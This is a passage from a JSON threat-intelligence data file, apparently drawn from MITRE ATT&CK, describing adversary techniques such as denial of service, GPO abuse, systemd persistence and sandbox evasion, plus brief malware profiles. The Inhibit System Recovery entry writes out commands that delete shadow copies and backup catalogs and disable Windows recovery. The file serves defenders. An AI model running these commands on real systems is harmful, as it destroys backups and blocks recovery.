    "description": "Adversaries may attempt to gather information on domain trust relationships that may be used to identify [Lateral Movement](https://attack.mitre.org/tactics/TA0008) opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1178), [Pass the Ticket](https://attack.mitre.org/techniques/T1097), and [Kerberoasting](https://attack.mitre.org/techniques/T1208).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the DSEnumerateDomainTrusts() Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)",
    "example_uses": []
  },
  "attack-pattern--c675646d-e204-4aa8-978d-e3d6d65885c4": {
    "id": "T1499",
    "name": "Endpoint Denial of Service",
    "examples": [],
    "similar_words": [
      "Endpoint Denial of Service"
    ],
    "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\n\nIn cases where traffic manipulation is used, there may be points in the the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\n\nFor attacks attempting to saturate the providing network, see the Network Denial of Service Technique [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\n\n### OS Exhaustion Flood\nSince operating systems (OSs) are responsible for managing the finite resources on a system, they can be a target for DoS. These attacks do not need to exhaust the actual resources on a system since they can simply exhaust the limits that an OS self-imposes to prevent the entire system from being overwhelmed by excessive demands on its capacity. Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018)\n\n#### SYN Flood\nWith SYN floods excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\n#### ACK Flood\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)\n\n### Service Exhaustion Flood\nDifferent network services provided by systems are targeted in different ways to conduct a DoS. Adversaries often target DNS and web servers, but other services have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.\n\n#### Simple HTTP Flood\nA large number of HTTP requests can be issued to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.(Citation: Cloudflare HTTPflood)\n\n#### SSL Renegotiation Attack\nSSL Renegotiation Attacks take advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012)\n\n### Application Exhaustion Flood\nWeb applications that sit on top of web server stacks can be targeted for DoS. Specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)\n\n### Application or System Exploitation\nSoftware vulnerabilities exist that when exploited can cause an application or system to crash and deny availability to users.(Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent DoS condition.",
    "example_uses": []
  },
  "attack-pattern--853c4192-4311-43e1-bfbb-b11b14911852": {
    "id": "T1480",
    "name": "Execution Guardrails",
    "examples": [],
    "similar_words": [
      "Execution Guardrails"
    ],
    "description": "Execution guardrails constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. \n\nGuardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.\n\nEnvironmental keying is one type of guardrail that includes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents) Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).\n\nSimilar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use guardrails and environmental keying to help protect their TTPs and evade detection. For example, environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) In general, guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) where a decision can be made not to further engage because the value conditions specified by the adversary are meant to be target specific and not such that they could occur in any environment.",
    "example_uses": []
  },
  "attack-pattern--f5bb433e-bdf6-4781-84bc-35e97e43be89": {
    "id": "T1495",
    "name": "Firmware Corruption",
    "examples": [],
    "similar_words": [
      "Firmware Corruption"
    ],
    "description": "Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices could include the motherboard, hard drive, or video cards.",
    "example_uses": []
  },
  "attack-pattern--ebb42bbe-62d7-47d7-a55f-3b08b61d792d": {
    "id": "T1484",
    "name": "Group Policy Modification",
    "examples": [],
    "similar_words": [
      "Group Policy Modification"
    ],
    "description": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. \n\nGroup policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predicable network path <code>\\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code>.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement [Scheduled Task](https://attack.mitre.org/techniques/T1053), [Disabling Security Tools](https://attack.mitre.org/techniques/T1089), [Remote File Copy](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1035) and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs) Publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)\n",
    "example_uses": []
  },
  "attack-pattern--f5d8eed6-48a9-4cdf-a3d7-d1ffa99c3d2a": {
    "id": "T1490",
    "name": "Inhibit System Recovery",
    "examples": [],
    "similar_words": [
      "Inhibit System Recovery"
    ],
    "description": "Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017)\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>",
    "example_uses": []
  },
  "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab": {
    "id": "T1498",
    "name": "Network Denial of Service",
    "examples": [],
    "similar_words": [
      "Network Denial of Service"
    ],
    "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS). Many different methods to accomplish such network saturation have been observed, but most fall into two main categories: Direct Network Floods and Reflection Amplification.\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).\n\n###Direct Network Flood###\n\nDirect Network Floods are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for Direct Network Floods. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\n###Reflection Amplification###\n\nAdversaries may amplify the volume of their attack traffic by using Reflection. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflector may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS May 2017)\n\nReflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan 2018)  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)",
    "example_uses": []
  },
  "attack-pattern--cd25c1b4-935c-4f0e-ba8d-552f28bc4783": {
    "id": "T1496",
    "name": "Resource Hijacking",
    "examples": [],
    "similar_words": [
      "Resource Hijacking"
    ],
    "description": "Adversaries may leverage the resources of co-opted systems in order to solve resource intensive problems which may impact system and/or hosted service availability. \n\nOne common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining.",
    "example_uses": []
  },
  "attack-pattern--ca205a36-c1ad-488b-aa6c-ab34bdd3a36b": {
    "id": "T1494",
    "name": "Runtime Data Manipulation",
    "examples": [],
    "similar_words": [
      "Runtime Data Manipulation"
    ],
    "description": "Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1042) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "example_uses": []
  },
  "attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b": {
    "id": "T1489",
    "name": "Service Stop",
    "examples": [],
    "similar_words": [
      "Service Stop"
    ],
    "description": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible (Citation: Novetta Blockbuster). In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services may not allow for modification of their data stores while running. Adversaries may stop services in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)",
    "example_uses": []
  },
  "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92": {
    "id": "T1492",
    "name": "Stored Data Manipulation",
    "examples": [],
    "similar_words": [
      "Stored Data Manipulation"
    ],
    "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "example_uses": []
  },
  "attack-pattern--0fff2797-19cb-41ea-a5f1-8a9303b8158e": {
    "id": "T1501",
    "name": "Systemd Service",
    "examples": [],
    "similar_words": [
      "Systemd Service"
    ],
    "description": "Systemd services can be used to establish persistence on a Linux system. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.\n\nSystemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories and have the file extension <code>.service</code>. Each service unit file may contain numerous directives that can execute system commands. \n\n* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. \n* ExecReload directive covers when a service restarts. \n* ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'.\n\nAdversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at recurring intervals, such as at system boot.(Citation: Anomali Rocke March 2019)(Citation: gist Arch package compromise 10JUL2018)(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018)\n\nWhile adversaries typically require root privileges to create/modify service unit files in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories, low privilege users can create/modify service unit files in directories such as <code>~/.config/systemd/user/</code> to achieve user-level persistence.(Citation: Rapid7 Service Persistence 22JUNE2016)",
    "example_uses": []
  },
  "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8": {
    "id": "T1493",
    "name": "Transmitted Data Manipulation",
    "examples": [],
    "similar_words": [
      "Transmitted Data Manipulation"
    ],
    "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "example_uses": []
  },
  "attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d": {
    "id": "T1497",
    "name": "Virtualization/Sandbox Evasion",
    "examples": [],
    "similar_words": [
      "Virtualization/Sandbox Evasion"
    ],
    "description": "Adversaries may check for the presence of a virtual machine environment (VME) or sandbox to avoid potential detection of tools and activities. If the adversary detects a VME, they may alter their malware to conceal the core functions of the implant or disengage from the victim. They may also search for VME artifacts before dropping secondary or additional payloads. \n\nAdversaries may use several methods including [Security Software Discovery](https://attack.mitre.org/techniques/T1063) to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) by searching for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) to help determine if it is an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandboxes. (Citation: Unit 42 Pirpi July 2015)\n\n###Virtual Machine Environment Artifacts Discovery###\n\nAdversaries may use utilities such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1086), [Systeminfo](https://attack.mitre.org/software/S0096), and the [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, and/or the Registry. Adversaries may use [Scripting](https://attack.mitre.org/techniques/T1064) to combine these checks into one script and then have the program exit if it determines the system to be a virtual environment. Also, in applications like VMWare, adversaries can use a special I/O port to send commands and receive output. Adversaries may also check the drive size. For example, this can be done using the Win32 DeviceIOControl function. \n\nExample VME Artifacts in the Registry(Citation: McAfee Virtual Jan 2017)\n\n* <code>HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions</code>\n* <code>HKLM\\HARDWARE\\Description\\System\\”SystemBiosVersion”;”VMWARE”</code>\n* <code>HKLM\\HARDWARE\\ACPI\\DSDT\\BOX_</code>\n\nExample VME files and DLLs on the system(Citation: McAfee Virtual Jan 2017)\n\n* <code>WINDOWS\\system32\\drivers\\vmmouse.sys</code> \n* <code>WINDOWS\\system32\\vboxhook.dll</code>\n* <code>Windows\\system32\\vboxdisp.dll</code>\n\nCommon checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017)\n\n###User Activity Discovery###\n\nAdversaries may search for user activity on the host (e.g., browser history, cache, bookmarks, number of files in the home directories, etc.) for reassurance of an authentic environment. They might detect this type of information via user interaction and digital signatures. They may have malware check the speed and frequency of mouse clicks to determine if it’s a sandboxed environment.(Citation: Sans Virtual Jan 2016) Other methods may rely on specific user interaction with the system before the malicious code is activated. Examples include waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) and waiting for a user to double click on an embedded image to activate (Citation: FireEye FIN7 April 2017).\n\n###Virtual Hardware Fingerprinting Discovery###\n\nAdversaries may check the fan and temperature of the system to gather evidence that can be indicative a virtual environment. An adversary may perform a CPU check using a WMI query <code>$q = “Select * from Win32_Fan” Get-WmiObject -Query $q</code>. If the results of the WMI query return more than zero elements, this might tell them that the machine is a physical one. (Citation: Unit 42 OilRig Sept 2018)",
    "example_uses": []
  },
  "malware--e7a5229f-05eb-440e-b982-9a6d2b2b87c8": {
    "id": "S0331",
    "name": "Agent Tesla",
    "examples": [],
    "similar_words": [
      "Agent Tesla"
    ],
    "description": "[Agent Tesla](https://attack.mitre.org/software/S0331) is a spyware Trojan written in visual basic.(Citation: Fortinet Agent Tesla April 2018)",
    "example_uses": []
  },
  "malware--edb24a93-1f7a-4bbf-a738-1397a14662c6": {
    "id": "S0373",
    "name": "Astaroth",
    "examples": [],
    "similar_words": [
      "Astaroth"
    ],
    "description": "[Astaroth](https://attack.mitre.org/software/S0373) is a Trojan and information stealer known to affect companies in Europe and Brazil. It has been known publicly since at least late 2017. (Citation: Cybereason Astaroth Feb 2019) (Citation: Cofense Astaroth Sept 2018)",
    "example_uses": []
  },
  "malware--24b4ce59-eaac-4c8b-8634-9b093b7ccd92": {
    "id": "S0347",
    "name": "AuditCred",
    "examples": [],
    "similar_words": [
      "AuditCred",
      "Roptimizer"
    ],
    "description": "[AuditCred](https://attack.mitre.org/software/S0347) is a malicious DLL that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032) during their 2018 attacks.(Citation: TrendMicro Lazarus Nov 2018)",
    "example_uses": []
  },
  "malware--f9b05f33-d45d-4e4d-aafe-c208d38a0080": {
    "id": "S0344",
    "name": "Azorult",
    "examples": [],
    "similar_words": [
      "Azorult"
    ],
    "description": "[Azorult](https://attack.mitre.org/software/S0344) is a commercial Trojan that is used to steal information from compromised hosts. [Azorult](https://attack.mitre.org/software/S0344) has been observed in the wild as early as 2016.\nIn July 2018, [Azorult](https://attack.mitre.org/software/S0344) was seen used in a spearphishing campaign against targets in North America. [Azorult](https://attack.mitre.org/software/S0344) has been seen used for cryptocurrency theft. (Citation: Unit42 Azorult Nov 2018)(Citation: Proofpoint Azorult July 2018)",
    "example_uses": []
  },
  "malware--d5268dfb-ae2b-4e0e-ac07-02a460613d8a": {
    "id": "S0360",
    "name": "BONDUPDATER",
    "examples": [],
    "similar_words": [
      "BONDUPDATER"
    ],
    "description": "[BONDUPDATER](https://attack.mitre.org/software/S0360) is a PowerShell backdoor used by [OilRig](https://attack.mitre.org/groups/G0049). It was first observed in November 2017 during targeting of a Middle Eastern government organization, and an updated version was observed in August 2018 being used to target a government organization with spearphishing emails.(Citation: FireEye APT34 Dec 2017)(Citation: Palo Alto OilRig Sep 2018)",
    "example_uses": []
  },
  "malware--9af05de0-bc09-4511-a350-5eb8b06185c1": {
    "id": "S0337",
    "name": "BadPatch",
    "examples": [],
    "similar_words": [
      "BadPatch"
    ],
    "description": "[BadPatch](https://attack.mitre.org/software/S0337) is a Windows Trojan that was used in a Gaza Hackers-linked campaign.(Citation: Unit 42 BadPatch Oct 2017)",
    "example_uses": []
  },
  "malware--d20b397a-ea47-48a9-b503-2e2a3551e11d": {
    "id": "S0351",
    "name": "Cannon",
    "examples": [],
    "similar_words": [
      "Cannon"
    ],
    "description": "[Cannon](https://attack.mitre.org/software/S0351) is a Trojan with variants written in C# and Delphi. It was first observed in April 2018. (Citation: Unit42 Cannon Nov 2018)(Citation: Unit42 Sofacy Dec 2018)",
    "example_uses": []
  },
  "malware--b7e9880a-7a7c-4162-bddb-e28e8ef2bf1f": {
    "id": "S0335",
    "name": "Carbon",
    "examples": [],
    "similar_words": [
      "Carbon"
    ],
    "description": "[Carbon](https://attack.mitre.org/software/S0335) is a sophisticated, second-stage backdoor and framework that can be used to steal sensitive information from victims. [Carbon](https://attack.mitre.org/software/S0335) has been selectively used by [Turla](https://attack.mitre.org/groups/G0010) to target government and foreign affairs-related organizations in Central Asia.(Citation: ESET Carbon Mar 2017)(Citation: Securelist Turla Oct 2018)",
    "example_uses": []
  },
  "malware--b879758f-bbc4-4cab-b5ba-177ac9b009b4": {
    "id": "S0348",
    "name": "Cardinal RAT",
    "examples": [],
    "similar_words": [
      "Cardinal RAT"
    ],
    "description": "[Cardinal RAT](https://attack.mitre.org/software/S0348) is a potentially low volume remote access trojan (RAT) observed since December 2015. [Cardinal RAT](https://attack.mitre.org/software/S0348) is notable for its unique utilization of uncompiled C# source code and the Microsoft Windows built-in csc.exe compiler.(Citation: PaloAlto CardinalRat Apr 2017)",
    "example_uses": []
  },
  "malware--aa1462a1-d065-416c-b354-bedd04998c7f": {
    "id": "S0338",
    "name": "Cobian RAT",
    "examples": [],
    "similar_words": [
      "Cobian RAT"
    ],
    "description": "[Cobian RAT](https://attack.mitre.org/software/S0338) is a backdoor, remote access tool that has been observed since 2016.(Citation: Zscaler Cobian Aug 2017)",
    "example_uses": []
  },
  "malware--d1531eaa-9e17-473e-a680-3298469662c3": {
    "id": "S0369",
    "name": "CoinTicker",
    "examples": [],
    "similar_words": [
      "CoinTicker"
    ],
    "description": "[CoinTicker](https://attack.mitre.org/software/S0369) is a malicious application that poses as a cryptocurrency price ticker and installs components of the open source backdoors EvilOSX and EggShell.(Citation: CoinTicker 2019)",
    "example_uses": []
  },
  "malware--53ab35c2-d00e-491a-8753-41d35ae7e547": {
    "id": "S0334",
    "name": "DarkComet",
    "examples": [],
    "similar_words": [
      "DarkComet",
      "DarkKomet",
      "Fynloski",
      "Krademok",
      "FYNLOS"
    ],
